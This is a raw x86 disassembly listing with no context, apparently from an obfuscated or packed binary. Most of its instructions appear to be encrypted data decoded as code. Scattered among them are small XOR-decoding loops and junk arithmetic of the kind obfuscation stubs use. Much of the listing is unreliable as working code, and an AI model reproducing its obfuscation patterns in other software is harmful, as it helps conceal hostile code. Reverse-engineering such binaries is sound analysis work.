  408c07:	adc    BYTE PTR [ebp+ebx*8-0xd],dl
  408c0b:	and    cl,BYTE PTR [ebx]
  408c0d:	inc    esp
  408c0e:	aaa    
  408c0f:	inc    ebx
  408c10:	mov    eax,ds:0xdfe990fd
  408c15:	loopne 0x408c80
  408c17:	cmc    
  408c18:	test   eax,0x923970a1
  408c1d:	mov    al,ds:0x1c0d55a1
  408c22:	cdq    
  408c23:	aaa    
  408c24:	mov    ebp,db4
  408c27:	jmp    0xa0e313f2
  408c2c:	into   
  408c2d:	mul    BYTE PTR [edi+0x52e54771]
  408c33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c34:	mov    ds:0x6c1298dc,al
  408c39:	jmp    0x408c0a
  408c3b:	out    dx,eax
  408c3c:	lods   al,BYTE PTR ds:[esi]
  408c3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c3e:	sar    DWORD PTR [edx+0x6e382309],0x55
  408c45:	sbb    BYTE PTR [eax],bl
  408c47:	retf   0x5946
  408c4a:	add    al,0x8e
  408c4c:	mov    esp,0x90525fdb
  408c51:	add    al,0xe
  408c53:	push   esi
  408c54:	leave  
  408c55:	call   0x41956f6d
  408c5a:	pop    ds
  408c5b:	(bad)  
  408c5c:	sbb    eax,0x8b9dea0a
  408c61:	dec    esp
  408c62:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  408c64:	shl    ecx,cl
  408c66:	std    
  408c67:	push   edi
  408c68:	ret    0x80dd
  408c6b:	in     eax,0xd
  408c6d:	xor    eax,0x66838b94
  408c72:	(bad)  
  408c74:	lods   eax,DWORD PTR ds:[esi]
  408c75:	nop
  408c76:	sbb    eax,0x7882f53e
  408c7b:	fsubr  QWORD PTR [ebx-0x7]
  408c7e:	aaa    
  408c7f:	pop    eax
  408c80:	pop    edi
  408c81:	or     edx,DWORD PTR [eax]
  408c83:	and    eax,esp
  408c85:	pop    edx
  408c86:	std    
  408c87:	pop    esp
  408c88:	push   esp
  408c89:	xor    BYTE PTR [ebx+0x45],ah
  408c8c:	jnp    0x408cec
  408c8e:	inc    ecx
  408c8f:	(bad)  
  408c91:	adc    DWORD PTR [eax],ebp
  408c93:	dec    eax
  408c94:	cmp    dh,bl
  408c96:	or     ecx,ebp
  408c98:	cli    
  408c99:	add    BYTE PTR [esi],al
  408c9b:	pop    gs
  408c9d:	cmp    al,0xec
  408c9f:	aad    0x27
  408ca1:	mov    ?,edi
  408ca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ca4:	inc    esi
  408ca5:	ret    
  408ca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ca7:	loope  0x408c5b
  408ca9:	pushf  
  408caa:	xchg   ebp,eax
  408cab:	and    DWORD PTR [ebx],eax
  408cad:	mov    ?,WORD PTR [edi-0x5ccc0a57]
  408cb3:	xchg   edi,eax
  408cb4:	sub    DWORD PTR ds:0xc735fe2e,ecx
  408cba:	outs   dx,DWORD PTR ds:[esi]
  408cbb:	jae    0x408d33
  408cbd:	mov    ebp,0x88aa69a0
  408cc2:	aad    0xd3
  408cc4:	lods   eax,DWORD PTR ds:[esi]
  408cc5:	ins    BYTE PTR es:[edi],dx
  408cc6:	test   al,ch
  408cc8:	aad    0xb7
  408cca:	jle    0x408c66
  408ccc:	clc    
  408ccd:	cs jbe 0x408cca
  408cd0:	test   BYTE PTR [esi-0x12],0xca
  408cd4:	jp     0x408ca4
  408cd6:	jns    0x408d28
  408cd8:	ret    
  408cd9:	call   0xced7:0xd006f2ca
  408ce0:	hlt    
  408ce1:	pop    ds
  408ce2:	repz xchg edx,eax
  408ce4:	jb     0x408c8d
  408ce6:	movzx  eax,WORD PTR [eax+edx*4]
  408cea:	xor    eax,0x8a43
  408cef:	add    eax,edi
  408cf1:	mov    edi,DWORD PTR [ebp-0x14]
  408cf4:	mov    BYTE PTR [ebp+edi*1-0x58],al
  408cf8:	mov    eax,DWORD PTR [ebp-0xc]
  408cfb:	inc    edx
  408cfc:	cmp    edx,eax
  408cfe:	jne    0x408b9f
  408d04:	pop    edi
  408d05:	pop    ebx
  408d06:	mov    eax,DWORD PTR [ebp-0x8]
  408d09:	mov    edx,DWORD PTR [ebp+0x10]
  408d0c:	xor    eax,ecx
  408d0e:	jmp    0x408e37
  408d13:	inc    esp
  408d14:	(bad)  
  408d15:	jno    0x408cee
  408d17:	icebp  
  408d18:	stc    
  408d19:	js     0x408d80
  408d1b:	xchg   esp,eax
  408d1c:	ins    BYTE PTR es:[edi],dx
  408d1d:	retf   0x6ea3
  408d20:	mov    esi,0x2f39bcd5
  408d25:	jle    0x408da5
  408d27:	or     bh,BYTE PTR [edi+0x7e]
  408d2a:	jle    0x408d19
  408d2c:	add    BYTE PTR [ebx-0x23f9bae9],dl
  408d32:	sub    DWORD PTR [esi+0x40],ecx
  408d35:	es (bad) 
  408d37:	out    0xe3,al
  408d39:	loop   0x408d43
  408d3b:	or     ebp,ecx
  408d3d:	sti    
  408d3e:	dec    edi
  408d3f:	dec    ebp
  408d40:	dec    esp
  408d41:	jecxz  0x408d72
  408d43:	icebp  
  408d44:	adc    DWORD PTR [edx-0x4b52fa02],edx
  408d4a:	sub    cl,dh
  408d4c:	pop    es
  408d4d:	mov    edi,0xbd6769fd
  408d52:	fidivr WORD PTR ds:0xa1de339f
  408d58:	fnstcw WORD PTR [edx+0x178d1fb3]
  408d5e:	xchg   esp,eax
  408d5f:	xchg   ebp,eax
  408d60:	xchg   esi,eax
  408d61:	sahf   
  408d62:	xchg   edi,eax
  408d63:	iret   
  408d64:	jg     0x408ce6
  408d66:	dec    edx
  408d67:	int3   
  408d68:	cmp    bl,BYTE PTR [eax+0x5b94bcdf]
  408d6e:	lock push ebx
  408d70:	les    ebp,FWORD PTR [edx]
  408d72:	es inc eax
  408d74:	adc    BYTE PTR [eax+ecx*2-0x29],bl
  408d78:	push   ss
  408d79:	mov    al,ds:0x85a0ff93
  408d7e:	jl     0x408d0f
  408d80:	push   ecx
  408d81:	and    DWORD PTR [ebx],eax
  408d83:	stos   DWORD PTR es:[edi],eax
  408d84:	scas   al,BYTE PTR es:[edi]
  408d85:	xchg   ecx,eax
  408d86:	fsubr  DWORD PTR [eax+0x7c333622]
  408d8c:	push   ebp
  408d8d:	dec    ecx
  408d8e:	mov    ebp,esi
  408d90:	dec    ebx
  408d91:	dec    ecx
  408d92:	xchg   edx,eax
  408d93:	ss or  al,0x85
  408d96:	mov    esi,0xcafd39af
  408d9b:	scas   al,BYTE PTR es:[edi]
  408d9c:	outs   dx,DWORD PTR ds:[esi]
  408d9d:	adc    ah,BYTE PTR ds:0x538ad252
  408da3:	mov    al,0xda
  408da5:	es call 0xe9c1:0xf1ddffcd
  408dad:	mov    ebx,0xcb3a2a5d
  408db2:	bound  ebx,QWORD PTR [edi+0x1a3dfecb]
  408db8:	sub    bl,cl
  408dba:	out    dx,eax
  408dbb:	enter  0xb214,0xdf
  408dbf:	jmp    FWORD PTR [edi]
  408dc1:	pop    eax
  408dc2:	inc    ecx
  408dc3:	outs   dx,DWORD PTR ds:[esi]
  408dc4:	ins    BYTE PTR es:[edi],dx
  408dc5:	xchg   ebp,eax
  408dc6:	sub    al,0xaf
  408dc8:	pop    ebx
  408dc9:	mov    ebx,0xd2bff37
  408dce:	cmp    BYTE PTR [ebx],bl
  408dd0:	adc    bh,BYTE PTR [ecx]
  408dd2:	ds pop ecx
  408dd4:	sub    DWORD PTR [edx],0xe85cb963
  408dda:	jg     0x408e03
  408ddc:	enter  0x311,0x2b
  408de0:	adc    eax,0x43b36195
  408de5:	cmp    eax,0x2eefdda2
  408dea:	bound  eax,QWORD PTR [ebx*4-0x5a9e3a1]
  408df1:	bnd jbe 0x408df2
  408df4:	outs   dx,BYTE PTR ds:[esi]
  408df5:	out    dx,al
  408df6:	scas   eax,DWORD PTR es:[edi]
  408df7:	sub    ch,bh
  408df9:	popa   
  408dfa:	or     eax,esp
  408dfc:	stos   DWORD PTR es:[edi],eax
  408dfd:	arpl   WORD PTR [edi],cx
  408dff:	mov    bh,0xb8
  408e01:	fcomp  QWORD PTR [eax-0x36237891]
  408e07:	mov    dh,0xa
  408e09:	cmp    dl,BYTE PTR [ecx]
  408e0b:	or     BYTE PTR [ebp+ebp*1+0x52],bl
  408e0f:	imul   edx,DWORD PTR [edx],0xae1294ca
  408e15:	cmp    ecx,ecx
  408e17:	shl    ah,0x3d
  408e1a:	loopne 0x408dd5
  408e1c:	es pop edx
  408e1e:	mov    bh,0x5e
  408e20:	jno    0x408dcd
  408e22:	dec    edx
  408e23:	fs mov bh,0x8b
  408e26:	mov    al,ds:0xf0d8acf9
  408e2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e2c:	cli    
  408e2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e2e:	lods   al,BYTE PTR ds:[esi]
  408e2f:	in     eax,dx
  408e30:	stos   DWORD PTR es:[edi],eax
  408e31:	xchg   ebp,eax
  408e32:	pusha  
  408e33:	inc    ebp
  408e34:	mov    ecx,0xc6039b43
  408e39:	mov    DWORD PTR [edx],eax
  408e3b:	jmp    0x408f64
  408e40:	dec    eax
  408e41:	sub    ecx,DWORD PTR [edx]
  408e43:	lock imul edx,DWORD PTR [ecx+0x1c4aeb48],0x6b21de2b
  408e4e:	aaa    
  408e4f:	xchg   edx,eax
  408e50:	xor    eax,0xa7e7e2c
  408e55:	jg     0x408ed5
  408e57:	jle    0x408e03
  408e59:	inc    esi
  408e5a:	jmp    0xf305:0x46b98fac
  408e61:	js     0x408e2e
  408e63:	adc    esp,edi
  408e65:	je     0x408e2e
  408e67:	imul   esp,esi,0xfffffff3
  408e6a:	cmp    edx,DWORD PTR ds:[edi]
  408e6d:	imul   edi,DWORD PTR [ecx],0xffffffef
  408e70:	data16 sub dl,ah
  408e73:	inc    ecx
  408e74:	jnp    0x408e5f
  408e76:	xor    DWORD PTR [ebx],0x13
  408e79:	sahf   
  408e7a:	popa   
  408e7b:	loopne 0x408ec9
  408e7d:	jmp    0xa39b:0x1e56ed63
  408e84:	push   ds
  408e85:	loopne 0x408e7d
  408e87:	mov    ebp,0x7b865730
  408e8c:	sbb    al,0xc
  408e8e:	test   ah,0xdc
  408e91:	stc    
  408e92:	push   esp
  408e93:	scas   al,BYTE PTR es:[edi]
  408e94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e95:	inc    ecx
  408e96:	inc    ebx
  408e97:	gs stos BYTE PTR es:[edi],al
  408e99:	cdq    
  408e9a:	test   ah,dl
  408e9c:	or     BYTE PTR [ebx+0x207507c8],ch
  408ea2:	retf   0xa667
  408ea5:	icebp  
  408ea6:	rcr    DWORD PTR [ecx+0x70],cl
  408ea9:	in     eax,0xd6
  408eab:	data16 jae 0x408e57
  408eae:	mov    ch,BYTE PTR [esi-0x5c]
  408eb1:	fidiv  DWORD PTR [eax]
  408eb3:	je     0x408ef9
  408eb5:	gs inc ebx
  408eb7:	mov    WORD PTR [esi-0x44],cs
  408eba:	mov    eax,0x576c82e6
  408ebf:	dec    ecx
  408ec0:	neg    edi
  408ec2:	aam    0xe9
  408ec4:	test   DWORD PTR [ebx-0x37],0x5a18aa4d
  408ecb:	data16 jl 0x408e70
  408ece:	out    0xc9,eax
  408ed0:	pop    esp
  408ed1:	pop    eax
  408ed2:	push   cs
  408ed3:	aaa    
  408ed4:	sbb    eax,0x72f28a26
  408ed9:	or     al,dl
  408edb:	lods   al,BYTE PTR ds:[esi]
  408edc:	cli    
  408edd:	push   ds
  408ede:	popf   
  408edf:	int    0xab
  408ee1:	jmp    0x408f1f
  408ee3:	(bad)  
  408ee4:	pop    ss
  408ee5:	out    0xa2,al
  408ee7:	lea    esp,[eax+0x8d341c6]
  408eed:	fistp  DWORD PTR [ebp+0x5e]
  408ef0:	js     0x408e99
  408ef2:	adc    eax,0xad68f1f8
  408ef7:	pop    esi
  408ef8:	and    ah,BYTE PTR [ebp-0x1fb86636]
  408efe:	sub    DWORD PTR [ecx],0x51634f0a
  408f04:	sahf   
  408f05:	mov    esp,0x373d3026
  408f0a:	out    dx,eax
  408f0b:	call   edi
  408f0d:	mov    ch,0xac
  408f0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f10:	stos   DWORD PTR es:[edi],eax
  408f11:	xor    DWORD PTR [ebx+0x749d130b],0xa
  408f18:	inc    ecx
  408f19:	push   eax
  408f1a:	dec    eax
  408f1b:	push   ds
  408f1c:	int3   
  408f1d:	cmp    DWORD PTR [eax-0x14],ebp
  408f20:	scas   eax,DWORD PTR es:[edi]
  408f21:	daa    
  408f22:	adc    ebp,DWORD PTR ds:0xb94ba8ee
  408f28:	adc    eax,0xf8fc1e5f
  408f2d:	mov    eax,DWORD PTR [ebp+0x73dae58c]
  408f33:	mov    dh,0x98
  408f35:	fistp  WORD PTR [edi]
  408f37:	push   ebx
  408f38:	lahf   
  408f39:	inc    edi
  408f3a:	out    0x42,eax
  408f3c:	jg     0x408f13
  408f3e:	adc    al,0xa
  408f40:	jb     0x408ef9
  408f42:	xchg   ebx,eax
  408f43:	jg     0x408f03
  408f45:	xor    al,0x5f
  408f47:	fcmovb st,st(0)
  408f49:	and    al,0x85
  408f4b:	fdivr  st,st(4)
  408f4d:	mov    ?,WORD PTR [ebx+0x2e47ba82]
  408f53:	push   ss
  408f54:	mov    ebp,0x7f5a42ce
  408f59:	clc    
  408f5a:	and    DWORD PTR [esi+0x719f6373],ebp
  408f60:	pop    edi
  408f61:	mov    esp,0x458b4b95
  408f66:	clc    
  408f67:	xor    eax,ecx
  408f69:	add    eax,esi
  408f6b:	mov    DWORD PTR [ebp+0x8],eax
  408f6e:	mov    eax,DWORD PTR [ebp+0x8]
  408f71:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408f75:	mov    dl,BYTE PTR [ebp-0x1]
  408f78:	cmp    al,dl
  408f7a:	je     0x4090e6
  408f80:	mov    eax,DWORD PTR [ebp+0x8]
  408f83:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408f87:	mov    edx,DWORD PTR [ebp+0xc]
  408f8a:	cmp    al,BYTE PTR [edx]
  408f8c:	jne    0x40935e
  408f92:	mov    eax,DWORD PTR [ebp-0x8]
  408f95:	mov    edx,DWORD PTR [ebp+0xc]
  408f98:	jmp    0x4090c1
  408f9d:	jmp    0x7952d498
  408fa2:	loopne 0x40901d
  408fa4:	mov    ch,0xbe
  408fa6:	jmp    0x6672b935
  408fab:	cmp    BYTE PTR [ecx+0x7e7e2dc1],bh
  408fb1:	or     bh,BYTE PTR [edi+0x7e]
  408fb4:	jle    0x408f91
  408fb6:	stos   BYTE PTR es:[edi],al
  408fb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fb8:	and    DWORD PTR [ecx],0xffffffcb
  408fbb:	mov    bh,0xf
  408fbd:	dec    ecx
  408fbe:	pop    ebp
  408fbf:	push   ebx
  408fc0:	dec    esi
  408fc1:	and    al,0xcc
  408fc3:	dec    esi
  408fc4:	repnz ins BYTE PTR es:[edi],dx
  408fc6:	popf   
  408fc7:	xchg   esi,eax
  408fc8:	jp     0x408f8f
  408fca:	ds mov cl,0x8e
  408fcd:	outs   dx,DWORD PTR ds:[esi]
  408fce:	xor    eax,0xe8e00531
  408fd3:	dec    esp
  408fd4:	aad    0xb8
  408fd6:	push   eax
  408fd7:	xor    edx,DWORD PTR [eax]
  408fd9:	jnp    0x409023
  408fdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fdc:	xchg   edx,eax
  408fdd:	pop    esp
  408fde:	mov    DWORD PTR [edi],esp
  408fe0:	and    dl,BYTE PTR fs:[ebx-0x66]
  408fe4:	(bad)  [ebx-0x73]
  408fe7:	nop
  408fe8:	jne    0x408fe9
  408fea:	daa    
  408feb:	add    eax,0x276199a3
  408ff0:	fld    TBYTE PTR [eax+0x602393f5]
  408ff6:	dec    ecx
  408ff7:	ins    BYTE PTR es:[edi],dx
  408ff8:	jns    0x408f84
  408ffa:	cmp    ebx,ebp
  408ffc:	repnz loope 0x408fd3
  408fff:	aad    0xea
  409001:	repz mov eax,0x933cae7a
  409007:	or     bh,ah
  409009:	stos   BYTE PTR es:[edi],al
  40900a:	sbb    WORD PTR ss:[ebp+0x64af06ec],bp
  409012:	or     DWORD PTR [ebx+0x444627e4],0x57
  409019:	pushf  
  40901a:	mov    bl,0xa0
  40901c:	popf   
  40901d:	dec    esp
  40901e:	scas   al,BYTE PTR es:[edi]
  40901f:	xchg   ebx,eax
  409020:	adc    al,BYTE PTR [ecx]
  409022:	push   ds
  409023:	pop    DWORD PTR [edi-0x67]
  409026:	stos   DWORD PTR es:[edi],eax
  409027:	add    eax,0xe0a2aab2
  40902c:	enter  0xd900,0xaa
  409030:	mov    al,ds:0x7747213e
  409035:	jmp    0x1989b4ca
  40903a:	cs pop edx
  40903c:	rcl    bl,0x98
  40903f:	daa    
  409040:	mov    eax,0xe2667ea4
  409045:	or     esi,edx
  409047:	scas   eax,DWORD PTR es:[edi]
  409048:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409049:	xor    ebp,ebx
  40904b:	xchg   edi,eax
  40904c:	enter  0x2027,0xbb
  409050:	aam    0x2d
  409052:	das    
  409053:	frstor [ebx+0x7a]
  409056:	out    0xaa,eax
  409058:	inc    edx
  409059:	daa    
  40905a:	mov    ebx,0x9b136a0b
  40905f:	sub    ecx,DWORD PTR [eax+edx*4]
  409062:	std    
  409063:	xchg   edi,eax
  409064:	lea    esp,[edx+0x1f]
  409067:	outs   dx,DWORD PTR ds:[esi]
  409068:	nop
  409069:	loopne 0x4090c8
  40906b:	je     0x4090eb
  40906d:	pop    es
  40906e:	rcr    al,cl
  409070:	xchg   edi,eax
  409071:	mov    dh,0x6c
  409073:	call   0x5b3:0x8ef0222
  40907a:	or     eax,0x5e3ff9b
  40907f:	push   esi
  409080:	sub    eax,0xfb651348
  409085:	inc    ecx
  409086:	sub    DWORD PTR es:[eax],0xa
  40908a:	ja     0x409043
  40908c:	ja     0x4090dd
  40908e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40908f:	hlt    
  409090:	inc    eax
  409091:	retf   0xe2dc
  409094:	ficom  DWORD PTR [esp+eax*1]
  409097:	pop    edi
  409098:	jbe    0x4090be
  40909a:	in     eax,0x12
  40909c:	inc    ebx
  40909d:	pop    ss
  40909e:	xchg   ecx,eax
  40909f:	rol    BYTE PTR [edi-0x18e95d00],1
  4090a5:	xadd   ecx,esp
  4090a8:	rcl    BYTE PTR [ebx+0x1b],1
  4090ab:	data16 or dl,ch
  4090ae:	pop    esi
  4090af:	lock imul esi,DWORD PTR [esi-0x2a],0x8ee37648
  4090b7:	add    DWORD PTR [eax+0x33],edx
  4090ba:	lods   eax,DWORD PTR ds:[esi]
  4090bb:	xlat   BYTE PTR ds:[ebx]
  4090bc:	call   0x5a752aef
  4090c1:	movsx  edx,BYTE PTR [edx]
  4090c4:	xor    eax,ecx
  4090c6:	add    eax,esi
  4090c8:	cmp    edx,eax
  4090ca:	je     0x409229
  4090d0:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  4090d7:	lea    eax,[ebp-0x18]
  4090da:	mov    DWORD PTR [ebp-0x14],eax
  4090dd:	mov    eax,DWORD PTR [ebp-0x14]
  4090e0:	add    DWORD PTR [eax],0x705fa8e
  4090e6:	mov    eax,DWORD PTR [ebp-0x10]
  4090e9:	jmp    0x409212
  4090ee:	lods   eax,DWORD PTR ds:[esi]
  4090ef:	lock test BYTE PTR [ecx+edi*4],al
  4090f3:	sbb    BYTE PTR [ebp-0x47188557],ch
  4090f9:	daa    
  4090fa:	pusha  
  4090fb:	or     eax,esi
  4090fd:	and    bl,ch
  4090ff:	and    bh,BYTE PTR [esi+0x7e]
  409102:	or     bh,BYTE PTR [edi+0x7e]
  409105:	jle    0x409172
  409107:	mov    dl,0x6d
  409109:	cmp    BYTE PTR [edi+0x1d],bh
  40910c:	stos   BYTE PTR es:[edi],al
  40910d:	rcr    BYTE PTR [esi+0x3d333fd4],0x8e
  409114:	push   ds
  409115:	call   0x52b37288
  40911a:	xchg   ebp,eax
  40911b:	pushf  
  40911c:	mov    dh,0xbf
  40911e:	cmp    bh,BYTE PTR [eax+0x44293c64]
  409124:	shl    DWORD PTR [eax],0xed
  409127:	(bad)  
  409128:	out    0xb3,eax
  40912a:	mov    ds:0xfb722e79,eax
  40912f:	shl    DWORD PTR [ebp+0x71dad90e],cl
  409135:	aam    0x60
  409137:	loopne 0x4091b2
  409139:	and    dl,BYTE PTR [ecx+0x48]
  40913c:	mov    WORD PTR [esi+0x70],ds
  40913f:	sbb    BYTE PTR [eax-0x2a],al
  409142:	ror    DWORD PTR [eax],cl
  409144:	sub    ah,BYTE PTR [edi+0x17]
  409147:	mov    dl,ch
  409149:	out    0x2c,al
  40914b:	xchg   ebx,eax
  40914d:	mov    bl,0xd
  40914f:	xchg   ecx,eax
  409150:	pop    esi
  409151:	or     edx,DWORD PTR [esi]
  409153:	pop    esp
  409154:	push   cs
  409155:	jge    0x4091b5
  409157:	xor    al,0x76
  409159:	mov    ds:0x9c8ae716,eax
  40915e:	pop    ecx
  40915f:	jmp    0x9656:0x3fb5156a
  409166:	sbb    ch,BYTE PTR [edi]
  409168:	repz mov ds:0x4634b618,eax
  40916e:	sub    al,0x7a
  409170:	cdq    
  409171:	(bad)  
  409172:	pop    esi
  409173:	inc    edi
  409174:	mov    al,0x36
  409176:	data16 (bad) 
  409178:	mov    esp,0xad092695
  40917d:	std    
  40917e:	inc    esp
  40917f:	je     0x409139
  409181:	dec    ecx
  409182:	cmp    dh,BYTE PTR [ecx]
  409184:	dec    eax
  409185:	adc    esi,DWORD PTR [ecx+0x10c56e4a]
  40918b:	scas   eax,DWORD PTR es:[edi]
  40918c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40918d:	into   
  40918e:	cmp    eax,0xecc005f8
  409193:	imul   edx,DWORD PTR [edx],0x8
  409196:	mov    al,0xa6
  409198:	cmp    al,0xfc
  40919a:	ror    edi,1
  40919c:	fdiv   st,st(5)
  40919e:	push   ebp
  40919f:	fcom   DWORD PTR [eax-0x5b]
  4091a2:	inc    esi
  4091a3:	jecxz  0x40921e
  4091a5:	ja     0x409172
  4091a7:	in     al,dx
  4091a8:	mov    dh,0xe5
  4091aa:	and    dl,cl
  4091ac:	sub    edi,0xffffffb0
  4091af:	sub    BYTE PTR [ebx+0x14],al
  4091b2:	push   0x725909f2
  4091b7:	inc    ecx
  4091b8:	and    al,0x44
  4091ba:	inc    esi
  4091bb:	cmp    ecx,DWORD PTR [ebx]
  4091bd:	das    
  4091be:	nop
  4091bf:	call   0x2643:0x5121
  4091c5:	add    ebx,edi
  4091c7:	enter  0x1164,0x81
  4091cb:	in     eax,dx
  4091cc:	xor    DWORD PTR [ecx-0x63e715b0],esi
  4091d2:	mov    WORD PTR [ecx+0x28ea03c7],es
  4091d8:	mov    ecx,0x8b227baf
  4091dd:	mov    esp,0x593c7e5d
  4091e2:	mov    edx,0x6195cb68
  4091e7:	push   0xfffffffc
  4091e9:	sub    esp,DWORD PTR [ebp-0x48ea873a]
  4091ef:	mov    ds:0xaeddc5be,eax
  4091f4:	setle  BYTE PTR [edi]
  4091f7:	dec    ebx
  4091f8:	and    DWORD PTR ds:0x967df205,eax
  4091fe:	test   DWORD PTR [edi-0x249e1516],esp
  409204:	xor    eax,0x39499c15
  409209:	and    al,bl
  40920b:	xor    al,0xd8
  40920d:	fucomi st,st(5)
  40920f:	sub    ebp,DWORD PTR [esi]
  409211:	cmp    al,0x8b
  409213:	push   ebp
  409214:	or     BYTE PTR [ebx],dh
  409216:	ror    DWORD PTR [ebp+0x729f1084],0x32
  40921d:	add    BYTE PTR [ecx+0x45ff0845],cl
  409223:	or     al,0xe9
  409225:	inc    ebp
  409226:	std    
  409227:	(bad)  
  409228:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  40922e:	jmp    0x409357
  409233:	or     DWORD PTR ds:0xd93acb2e,ebx
  409239:	stc    
  40923a:	(bad)  [ecx-0x79785839]
  409240:	mov    cl,0x97
  409242:	add    eax,0x7e7e23e9
  409247:	or     bh,BYTE PTR [edi+0x7e]
  40924a:	jle    0x4092c7
  40924c:	js     0x40929e
  40924e:	cli    
  40924f:	js     0x4091dc
  409251:	inc    esp
  409252:	ret    0x7b5b
  409255:	ror    BYTE PTR [eax],1
  409257:	sbb    bl,BYTE PTR [esi+eax*2]
  40925a:	shl    DWORD PTR [eax],cl
  40925c:	xchg   DWORD PTR ds:0xc3251c78,edx
  409262:	jo     0x4092a9
  409264:	mov    esp,0x9b295689
  409269:	pop    edx
  40926a:	mov    dl,0xd0
  40926c:	add    al,0x68
  40926e:	mov    edx,0x634307a2
  409273:	mov    eax,ds:0x4e2b43f9
  409278:	sti    
  409279:	mov    eax,0xcd6e7a04
  40927e:	loopne 0x409249
  409280:	adc    eax,0x1fe3e46a
  409285:	or     ebp,DWORD PTR [esp+ecx*1-0x2e1f194]
  40928c:	fmul   QWORD PTR ds:[edx+edi*1]
  409290:	mov    esp,0x6e108f69
  409295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409296:	adc    cl,BYTE PTR [eax-0x3]
  409299:	fcom   DWORD PTR [ecx+0x225eea80]
  40929f:	jnp    0x40924a
  4092a1:	and    eax,DWORD PTR [edi-0x66033f76]
  4092a7:	sbb    BYTE PTR [esi+0x50],cl
  4092aa:	test   BYTE PTR [ecx],dh
  4092ac:	into   
  4092ad:	mov    dh,0xd6
  4092af:	cli    
  4092b0:	loope  0x4092d5
  4092b2:	daa    
  4092b3:	in     al,dx
  4092b4:	xchg   ebp,eax
  4092b5:	les    eax,FWORD PTR [ebp-0x2f]
  4092b8:	shl    BYTE PTR [ebx],cl
  4092ba:	lea    edi,[eax-0x56f599df]
  4092c0:	ds or  al,0x44
  4092c3:	scas   eax,DWORD PTR es:[edi]
  4092c4:	jl     0xa246a84b
  4092ca:	das    
  4092cb:	(bad)
  4092ce:	sub    BYTE PTR [esi+ebx*2+0x53],bh
  4092d2:	inc    ebx
  4092d3:	add    dl,BYTE PTR [ecx+0x3d]
  4092d6:	add    bh,dl
  4092d8:	sbb    al,0x7f
  4092da:	fnstenv [esi]
  4092dc:	xchg   BYTE PTR [ebx+0x1aa100f2],bl
  4092e2:	xor    al,0xaf
  4092e4:	inc    edi
  4092e5:	(bad)  
  4092e6:	sbb    eax,0xbfe1989a
  4092eb:	and    al,0xf4
  4092ed:	into   
  4092ee:	arpl   WORD PTR [edx-0x13],ax
  4092f1:	mov    ah,0xdf
  4092f3:	pop    esp
  4092f4:	fsub   QWORD PTR ds:0x1f7fcb03
  4092fa:	ins    DWORD PTR es:[edi],dx
  4092fb:	mov    al,ds:0xe8114e37
  409300:	(bad)
  409303:	call   0xbf1ac254
  409308:	cli    
  409309:	push   esp
  40930a:	mov    esi,0x7559e6d1
  40930f:	call   0x870b9afa
  409314:	lds    esp,FWORD PTR [edi-0x16]
  409317:	js     0x409300
  409319:	pop    esp
  40931a:	add    al,BYTE PTR [esi+0x48315e63]
  409320:	ds pop ss
  409322:	pop    eax
  409323:	push   edi
  409324:	call   0x4a046df5
  409329:	cmp    eax,0x1ff57dc0
  40932e:	pop    es
  40932f:	jmp    0xa3fb:0x806f637f
  409336:	loopne 0x409386
  409338:	call   0x4351:0xfc744ad2
  40933f:	fsubr  st(4),st
  409341:	outs   dx,BYTE PTR ds:[esi]
  409342:	add    al,0x7d
  409344:	jmp    0xd4d8:0xbc05ab36
  40934b:	mov    dl,0x91
  40934d:	sbb    bl,ah
  40934f:	jl     0x409319
  409351:	dec    ecx
  409352:	les    ecx,FWORD PTR [edx]
  409354:	lods   al,BYTE PTR ds:[esi]
  409355:	iret   
  409356:	stos   BYTE PTR es:[edi],al
  409357:	mov    ecx,DWORD PTR [ebp+0x10]
  40935a:	add    eax,esi
  40935c:	mov    DWORD PTR [ecx],eax
  40935e:	pop    esi
  40935f:	leave  
  409360:	ret    0xc
  409363:	push   ebp
  409364:	mov    ebp,esp
  409366:	push   ecx
  409367:	not    eax
  409369:	mov    DWORD PTR [ebp-0x4],0xf89c853c
  409370:	mov    eax,DWORD PTR [ebp-0x4]
  409373:	mov    edx,DWORD PTR [ebp+0x10]
  409376:	add    DWORD PTR ds:0x4245c6,ebx
  40937c:	mov    ecx,0x7510859
  409381:	adc    DWORD PTR ds:0x41235c,0x4245c6
  40938b:	xor    eax,ecx
  40938d:	add    eax,0x32729f
  409392:	and    DWORD PTR ds:0x412368,0x417e41
  40939c:	mov    DWORD PTR [edx],eax
  40939e:	mov    eax,DWORD PTR [ebp+0xc]
  4093a1:	and    DWORD PTR ds:0x4245be,0x0
  4093ab:	jmp    0x4093bd
  4093b0:	mov    edx,DWORD PTR ds:0x4245be
  4093b6:	inc    edx
  4093b7:	mov    DWORD PTR ds:0x4245be,edx
  4093bd:	cmp    DWORD PTR ds:0x4245be,0x14
  4093c4:	jae    0x4093eb
  4093ca:	cmp    DWORD PTR ds:0x4245be,0x1c
  4093d1:	jne    0x4093e0
  4093d7:	push   DWORD PTR [ebp-0x20]
  4093da:	call   DWORD PTR ds:0x40d1e8
  4093e0:	jmp    0x4093b0
  4093e5:	sub    DWORD PTR ds:0x41237c,ebx
  4093eb:	xor    eax,ecx
  4093ed:	adc    edx,DWORD PTR ds:0x412360
  4093f3:	push   esi
  4093f4:	add    esi,edx
  4093f6:	mov    esi,DWORD PTR [ebp+0x10]
  4093f9:	mov    edx,0x32729f
  4093fe:	add    eax,edx
  409400:	xor    DWORD PTR ds:0x41abda,0x417e49
